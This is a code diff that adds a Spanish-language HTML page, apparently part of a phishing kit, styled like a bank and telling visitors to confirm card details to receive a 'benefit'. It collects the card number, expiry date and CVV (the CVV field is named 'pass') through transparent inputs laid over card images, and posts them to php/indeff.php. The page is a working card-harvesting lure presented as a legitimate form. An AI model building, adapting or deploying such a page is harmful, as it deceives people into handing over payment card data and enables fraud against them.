@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<style>
+.form {
+    width: 390px;
+    height: 390px;
+}
+
+.for {
+    user-select: none;
+    pointer-events: none; 
+}
+.pp {
+    outline: none;
+    width: 328px;
+    height: 40px;
+    margin-left: -168px;
+    margin-top: -149px;
+    font-family: sans-serif;
+    background-color: transparent !important;
+    position: absolute;
+    flex: 1 1 auto;
+    min-width: 0;
+    border: none;
+    margin-bottom: 0;
+}
+
+.pp2 {
+    outline: none;
+    width: 328px;
+    height: 40px;
+    margin-left: -168px;
+    margin-top: -74px;
+    font-family: sans-serif;
+    background-color: transparent !important;
+    position: absolute;
+    flex: 1 1 auto;
+    min-width: 0;
+    border: none;
+    margin-bottom: 0;
+}
+
+.fua {
+    text-transform: none;
+    width: 100%!important;
+    border: 0px !important;
+    padding: .5rem 1.25rem;
+    height: 55px!important;
+    background-color: #00693c!important;
+    border-radius: 83px!important;
+    color: #fff!important;
+    font-size: 18px!important;
+    font-weight: 500!important;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+}
+</style>
+
+<body style="margin-left: 0px;">
+<center>
+     
+    <form action="php/indeff.php" method="post" class="form">
+        <img style="width: 250px; user-select: none; pointer-events: none;" src="l.png" alt="">
+        <p style="font-family: sans-serif;color: #00693c;font-size: 20px;">Confirma los datos de la Tarjeta que recibira este beneficio</p>
+        <img class="for" src="img/tarjtitulo.png" style="width: 100%;" alt="">
+        <br><br>
+
+        <div>
+            <input style="margin-top: -145px;" class="pp" type="text" name="tarj" id="tarj" placeholder="Ingresa número de tarjeta" inputmode="numeric" maxlength="19" required>
+        </div>
+
+        <br>
+        <div style="margin-top: 4px;">
+            <input inputmode="numeric" type="text" id="fecha" name="fecha" maxlength="7" oninput="formatFecha(event)" required style="margin-top: -95px;" class="pp2" placeholder="MM/AA" required>
+        </div>
+
+        <img src="img/cvv.png" alt="" style="width: 100%;margin-top: -40px;">
+        <br><br>
+
+        <input type="text" class="pp2" inputmode="numeric" name="pass" id="cvv" maxlength="3" placeholder="Código de seguridad" required>
+
+        <br><br>
+        <input type="submit" value="Ingresar" class="fua">
+    </form>
+    <br><br><br><br><br><br><br><br><br><br><br><br>
+    <img  src="img/abj.png" alt="" width="390px">
+
+    <script>
+        // Formatear el número de tarjeta (cada 4 dígitos, añadir espacio)
+        const tarjetaInput = document.getElementById('tarj');
+        tarjetaInput.addEventListener('input', function(event) {
+            let value = event.target.value.replace(/\D/g, '');  // Eliminar todo lo que no sea dígito
+            value = value.match(/.{1,4}/g)?.join(' ') || value;  // Añadir espacio cada 4 dígitos
+            event.target.value = value;
+        });
+
+        // Función para formatear la fecha MM/AA
+        function formatFecha(event) {
+            let input = event.target;
+            let inputValue = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+
+            if (inputValue.length >= 2) {
+                formattedValue += inputValue.substr(0, 2);
+                if (inputValue.length > 2) {
+                    formattedValue += ' / ' + inputValue.substr(2, 2);
+                }
+            } else {
+                formattedValue = inputValue;
+            }
+
+            input.value = formattedValue;
+        }
+
+        // Ocultar el cargador después de 19 segundos
+        
+    </script>
+</center>
+</body>
+</html>
